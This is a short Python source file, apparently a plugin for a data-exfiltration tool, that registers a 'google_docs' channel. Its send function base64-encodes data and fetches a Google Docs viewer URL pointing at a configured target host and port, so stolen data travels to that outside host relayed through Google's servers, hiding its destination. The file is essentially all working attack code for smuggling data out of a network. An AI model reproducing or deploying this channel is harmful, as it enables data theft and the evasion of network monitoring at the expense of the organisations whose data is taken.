import requests
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.request, urllib.parse, urllib.error

config = None
app_exfiltrate = None


def send(data):
    encoded_data = base64.b64encode(
        data.encode('utf-8') if isinstance(data, str) else data
    ).decode('ascii')
    target = "https://docs.google.com/viewer?url=http://{}:{}/{}".format(
        config['target'], config['port'], urllib.parse.quote_plus(encoded_data))
    app_exfiltrate.log_message(
        'info', "[google_docs] Sending {0} bytes to {1}".format(len(data), target))
    requests.get(target)


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('google_docs', {'send': send})
